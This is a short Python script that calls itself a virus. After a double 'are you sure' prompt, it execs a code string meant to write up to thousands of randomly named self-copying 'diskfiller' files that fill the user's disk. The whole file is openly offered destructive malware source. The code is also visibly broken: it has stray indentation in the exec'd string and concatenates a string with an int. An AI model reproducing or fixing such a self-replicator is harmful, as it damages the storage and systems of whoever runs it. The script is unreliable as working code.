import sys

def Payload():
   code = ("""
        
  from random import randint

  random_int = randint(0, 10000)
        
  f = open("diskfiller" + int(random_int) + ".py", "w")
  f.write(code)
  f.close()



  
        
        
        
  """)
   exec(code)





inmain = input("This could damage or destroy your computer, use at own risk. This virus can produce 1-10000 self-replicating files. Please undestand i am not responsible for any damages. Would you like to proceed in the execution? (Yes/n)")
yes = ["Yes", "y", "yes"]
no = ["No", "n", "no"]
if inmain in yes:
    insec = input("Are you sure?")
    if insec in yes:
        Payload()
    else:
      sys.exit()
    
    
if inmain in no:
    sys.exit()





